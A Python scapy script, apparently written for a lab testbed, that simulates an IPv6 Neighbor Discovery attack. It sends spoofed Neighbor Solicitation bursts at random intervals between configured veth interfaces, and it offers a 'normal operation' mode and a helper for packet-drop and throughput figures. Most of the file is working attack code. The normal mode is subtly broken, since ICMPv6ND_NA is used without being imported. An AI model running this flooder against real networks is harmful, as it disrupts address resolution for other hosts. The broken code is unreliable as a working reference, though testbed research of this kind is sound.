import random
import threading
import time
from scapy.all import Ether, IPv6, ICMPv6ND_NS, ICMPv6NDOptSrcLLAddr, sendp

# Configuration for each attack and normal operations
attacks = [
    {'src_ip': 'fe80::1', 'target_ip': 'fe80::3', 'src_mac': '02:01:01:01:01:01', 'target_mac': '02:01:01:01:01:03', 'iface': 'veth1'},
    {'src_ip': 'fe80::2', 'target_ip': 'fe80::4', 'src_mac': '02:01:01:01:01:02', 'target_mac': '02:01:01:01:01:04', 'iface': 'veth2'},
    {'src_ip': 'fe80::5', 'target_ip': 'fe80::7', 'src_mac': '02:01:01:01:01:05', 'target_mac': '02:01:01:01:01:07', 'iface': 'veth5'},
    {'src_ip': 'fe80::6', 'target_ip': 'fe80::8', 'src_mac': '02:01:01:01:01:06', 'target_mac': '02:01:01:01:01:08', 'iface': 'veth6'}
]

# Function to simulate the Neighbor Discovery attack
def simulate_nd_attack(src_ip, target_ip, src_mac, target_mac, iface, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        # Create the Ethernet frame
        ether = Ether(src=src_mac, dst=target_mac)
        
        # Create the IPv6 packet
        ipv6 = IPv6(src=src_ip, dst=target_ip)
        
        # Create the Neighbor Solicitation message
        ns = ICMPv6ND_NS(tgt=target_ip)
        
        # Create the Neighbor Discovery Option for Source Link-Layer Address
        src_ll_addr = ICMPv6NDOptSrcLLAddr(lladdr=src_mac)
        
        # Construct the full packet
        packet = ether / ipv6 / ns / src_ll_addr

        # Randomly decide whether to send 1 or 3 packets
        num_packets = random.choice([1, 3])
        
        for _ in range(num_packets):
            # Send the packet
            sendp(packet, iface=iface, verbose=False)

        # Random delay between packets
        delay = random.uniform(0.1, 1.0)  # Random delay between 0.1 and 1 second
        time.sleep(delay)

        remaining_time = end_time - time.time()
        print(f"Attacking (time remaining until attack stop: {int(remaining_time)} seconds)")
    print(f"Attack from {src_ip} to {target_ip} finished.")

# Function to simulate normal Neighbor Discovery operations
def simulate_normal_nd_operations(src_ip, target_ip, src_mac, target_mac, iface, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        # Create the Ethernet frame
        ether = Ether(src=src_mac, dst=target_mac)
        
        # Create the IPv6 packet
        ipv6 = IPv6(src=src_ip, dst=target_ip)
        
        # Create the Neighbor Solicitation message
        ns = ICMPv6ND_NS(tgt=target_ip)
        
        # Create the Neighbor Discovery Option for Source Link-Layer Address
        src_ll_addr = ICMPv6NDOptSrcLLAddr(lladdr=src_mac)
        
        # Construct the full Neighbor Solicitation packet
        ns_packet = ether / ipv6 / ns / src_ll_addr

        # Send the Neighbor Solicitation packet
        sendp(ns_packet, iface=iface, verbose=False)

        # Create the Neighbor Advertisement message
        na = ICMPv6ND_NA(tgt=src_ip, R=1, S=1, O=1)
        target_ll_addr = ICMPv6NDOptSrcLLAddr(lladdr=target_mac)
        
        # Construct the full Neighbor Advertisement packet
        na_packet = ether / IPv6(src=target_ip, dst=src_ip) / na / target_ll_addr

        # Send the Neighbor Advertisement packet
        sendp(na_packet, iface=iface, verbose=False)

        # Wait for 120 seconds before the next NS and NA exchange
        time.sleep(120)
        
        # Random delay between subsequent packets
        delay = random.uniform(1.0, 2.0)  # Random delay between 1 and 2 seconds
        time.sleep(delay)
    print(f"Normal ND operation from {src_ip} to {target_ip} finished.")

# Function to select and start an attack or normal operation
def start_simulation(option, index, duration):
    if 0 <= index < len(attacks):
        config = attacks[index]
        if option == 'attack':
            thread = threading.Thread(target=simulate_nd_attack, args=(
                config['src_ip'], 
                config['target_ip'], 
                config['src_mac'], 
                config['target_mac'], 
                config['iface'],
                duration  # Duration in seconds
            ))
        elif option == 'normal':
            thread = threading.Thread(target=simulate_normal_nd_operations, args=(
                config['src_ip'], 
                config['target_ip'], 
                config['src_mac'], 
                config['target_mac'], 
                config['iface'],
                duration  # Duration in seconds
            ))
        thread.start()
        thread.join()
    else:
        print("Invalid index. Please enter a number between 1 and 4.")

# Function to calculate and display results
def calculate_results():
    dropped_packets = int(input("Enter the number of dropped packets: "))
    successful_packets = int(input("Enter the number of successfully forwarded packets: "))
    duration = int(input("Enter the duration of the attack in minutes: ")) * 60  # Convert minutes to seconds

    total_packets = dropped_packets + successful_packets
    percentage_dropped = (dropped_packets / total_packets) * 100
    packet_size = 32 * 8  # 32 bytes converted to bits
    throughput = (successful_packets * packet_size) / duration  # Throughput in bits per second

    print(f"Total number of packets: {total_packets}")
    print(f"Percentage of dropped packets: {percentage_dropped:.2f}%")
    print(f"Throughput: {throughput:.2f} bits per second")

# Main program loop
def main():
    while True:
        print("Select an option:")
        print("1: Simulate Neighbor Discovery Attack")
        print("2: Simulate Normal Neighbor Discovery Operations")
        print("q: Quit")

        choice = input("Enter the number of the option (or 'q' to quit): ")
        if choice.lower() == 'q':
            break
        elif choice == '1':
            print("Select an attack:")
            for i, attack in enumerate(attacks, start=1):
                print(f"{i}: {attack['src_ip']} attacks {attack['target_ip']}")
            
            attack_choice = input("Enter the number of the attack to start: ")
            try:
                attack_index = int(attack_choice) - 1
                duration = int(input("Enter the duration of the attack in minutes: ")) * 60  # Convert minutes to seconds
                start_simulation('attack', attack_index, duration)
                calculate_results()
            except ValueError:
                print("Invalid input. Please enter a number.")
        elif choice == '2':
            print("Select a normal operation:")
            for i, attack in enumerate(attacks, start=1):
                print(f"{i}: {attack['src_ip']} to {attack['target_ip']}")

            normal_choice = input("Enter the number of the operation to start: ")
            try:
                normal_index = int(normal_choice) - 1
                duration = int(input("Enter the duration of the operation in minutes: ")) * 60  # Convert minutes to seconds
                start_simulation('normal', normal_index, duration)
            except ValueError:
                print("Invalid input. Please enter a number.")
        else:
            print("Invalid choice. Please enter 1, 2, or 'q'.")

if __name__ == "__main__":
    main()

print("All simulations completed.")

